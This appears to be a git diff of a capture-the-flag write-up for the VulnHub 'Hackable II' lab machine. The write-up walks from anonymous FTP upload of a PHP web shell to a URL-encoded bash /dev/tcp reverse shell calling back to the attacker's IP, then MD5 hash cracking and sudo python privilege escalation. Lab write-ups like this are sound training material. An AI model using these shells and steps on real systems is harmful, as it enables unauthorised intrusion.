@@ -1,5 +1,5 @@
 
->[!hint] You can find the [here](https://www.vulnhub.com/entry/hackable-ii,711/).
+> You can find the [here](https://www.vulnhub.com/entry/hackable-ii,711/).
 
 # Scanning :
 
@@ -27,7 +27,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
->[!question] note
+> Note
 >- So we see port 21 opened, which is for ftp. We also notice that **Anonymous FTP** is allowed, which means that we can connect via FTP without a user name or password.
 >- We also see that port 22 is opened, which is for ssh connection. For now it is useless as we don't have any credentials.
 >- Then we see port 80 open, which is for a web server. This is very interesting, as we usually start by searching there.
@@ -40,11 +40,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ftp anonymous@10.38.1.111
 ```
 
->[!bug] We find a file which is called CALL.html, but it doesn't seem to contain important informations.
+> We find a file which is called CALL.html, but it doesn't seem to contain important informations.
 
 # Web server scanning
 
->[!hint] We first check if there is any robots.txt file
+> We first check if there is any robots.txt file
 
 > There isn't
 
@@ -84,49 +84,49 @@ END_TIME: Mon Jul 31 14:23:09 2023
 DOWNLOADED: 4612 - FOUND: 2
 ```
 
->[!success] We found a directory who is listable and called "files", it might be interesting
+> We found a directory who is listable and called "files", it might be interesting
 
 # /files/ directory 
 
->[!question] note
+> Note
 >- /files/ is actually the ftp directory because we find the CALL.html file in it.
 >- It means that we can actually inject files in this directory and maybe obtain a reverse shell.
 
 # PHP command injection :
 
->[!hint] We create a php file which this code in it :
+> We create a php file which this code in it :
 >
 >```php
 ><?php system($_GET["cmd"]) ?>
 
->[!info] Explanations : 
+>Explanations : 
 >- The PHP `system()` function execute an external command and display the output.
 >- With `$_GET["cmd"]`, we can inject some commands in a variable named `cmd`, and it will be executed by the `system()` command.
 
 # Bash Reverse Shell :
 
->[!danger] Beforehand :
+> Beforehand :
 >We have to launch a listener on our attacking device, we'll use netcat : 
 >```sh
->nc -l -p 1234
+>nc -l -p 1234```
 
->[!hint] We just have to inject the following command in the `cmd` variable 
+> We just have to inject the following command in the `cmd` variable 
 >```sh
->cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F10.38.1.110%2F1234 0>%261"
+>cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F10.38.1.110%2F1234 0>%261"```
 
->[!info] Explanations :
+> Explanations :
 >- `-c`  tell to bash to read its instructions from a string, which is convenient when working on one line.
 >- `sh -i >%26 %2Fdev%2Ftcp%2F10.38.1.110%2F1234 0>%261` is just `sh -i >& /dev/tcp/10.38.1.110/1234 0>&1` [URL encoded](https://www.w3schools.com/tags/ref_urlencode.ASP) (it would not work otherwise)
 >- Overall, it tries to connect back to our **Attacker's device**.
 
->[!success] Connection made
+> Connection made
 
 # Connected as www-data
 
->[!hint] We now want to gain access to a user account.
+> We now want to gain access to a user account.
 >We first list the /home directory, and we find a user named **shrek**
 
->[!question] We also find a file named important.txt
+> We also find a file named important.txt
 >It tells us to go run a hidden bash script in the / directory names .runme.sh
 >
 
@@ -149,25 +149,25 @@ DOWNLOADED: 4612 - FOUND: 2
     shrek:cf4c2232354952690368f1b3dfdfb24d
 ```
 
->[!hint] We now have what seems to be the hashed password of the shrek user.
+> We now have what seems to be the hashed password of the shrek user.
 
->[!info] Common knowledge :
+>Common knowledge :
 >- Default password hashing in Linux systems is in MD5.
 >- We can use [tunnels up](https://www.tunnelsup.com/hash-analyzer/) to be sure of it.
 
 
 # Hash cracking 
 
->[!hint] Solutions
+> Solutions
 >- We can use John, but for simplicity, we will use [crackstation](https://crackstation.net/) 
 >- We find that the hash is in fact `onion`
 
 # SSH connection
 
->[!success] Connection
+> Connection
 >We now have the user : `shrek`, and the password: `onion`
 
->[!hint] USER FLAG
+> USER FLAG
 >We connect and find the following flag :
 
 ```txt
@@ -214,14 +214,14 @@ invite-me: ["linkedin link, you will have to do the ctf to have it"]
 
 # Privilege escalation's vectors :
 
->[!important] Scanning for a vector of attack
+> Scanning for a vector of attack
 >- We import from our attacking machine the `linpeas.sh` script, which is very efficient (`python -m http.server 8000` on the attacker device and `wget http://10.38.1.110:8000/linpeas.sh` from the ssh connection to the target device)
 
 > We then wait for the script to terminate.
 
 # Root access 
 
->[!hint] We find, in the linpeas' script's output, that our user have all privileges with python3.5 :
+> We find, in the linpeas' script's output, that our user have all privileges with python3.5 :
 >```sh
 >shrek ALL = NOPASSWD:/usr/bin/python3.5
 >```
@@ -229,5 +229,47 @@ invite-me: ["linkedin link, you will have to do the ctf to have it"]
 >```sh
 >sudo /usr/bin/python3.5 -c 'import pty;pty.spawn("/bin/bash")'
 
->[!success] Root access
+> Root access
 
+```txt
+                            ____
+        ____....----''''````    |.
+,'''````            ____....----; '.
+| __....----''''````         .-.`'. '.
+|.-.                .....    | |   '. '.
+`| |        ..:::::::::::::::| |   .-;. |
+ | |`'-;-::::::::::::::::::::| |,,.| |-='
+ | |   | ::::::::::::::::::::| |   | |
+ | |   | :::::::::::::::;;;;;| |   | |
+ | |   | :::::::::;;;2KY2KY2Y| |   | |
+ | |   | :::::;;Y2KY2KY2KY2KY| |   | |
+ | |   | :::;Y2Y2KY2KY2KY2KY2| |   | |
+ | |   | :;Y2KY2KY2KY2KY2K+++| |   | |
+ | |   | |;2KY2KY2KY2++++++++| |   | |
+ | |   | | ;++++++++++++++++;| |   | |
+ | |   | |  ;++++++++++++++;.| |   | |
+ | |   | |   :++++++++++++:  | |   | |
+ | |   | |    .:++++++++;.   | |   | |
+ | |   | |       .:;+:..     | |   | |
+ | |   | |         ;;        | |   | |
+ | |   | |      .,:+;:,.     | |   | |
+ | |   | |    .::::;+::::,   | |   | |
+ | |   | |   ::::::;;::::::. | |   | |
+ | |   | |  :::::::+;:::::::.| |   | |
+ | |   | | ::::::::;;::::::::| |   | |
+ | |   | |:::::::::+:::::::::| |   | |
+ | |   | |:::::::::+:::::::::| |   | |
+ | |   | ::::::::;+++;:::::::| |   | |
+ | |   | :::::::;+++++;::::::| |   | |
+ | |   | ::::::;+++++++;:::::| |   | |
+ | |   |.:::::;+++++++++;::::| |   | |
+ | | ,`':::::;+++++++++++;:::| |'"-| |-..
+ | |'   ::::;+++++++++++++;::| |   '-' ,|
+ | |    ::::;++++++++++++++;:| |     .' |
+,;-'_   `-._===++++++++++_.-'| |   .'  .'
+|    ````'''----....___-'    '-' .'  .'
+'---....____           ````'''--;  ,'
+            ````''''----....____|.'
+
+invite-me: 
+```
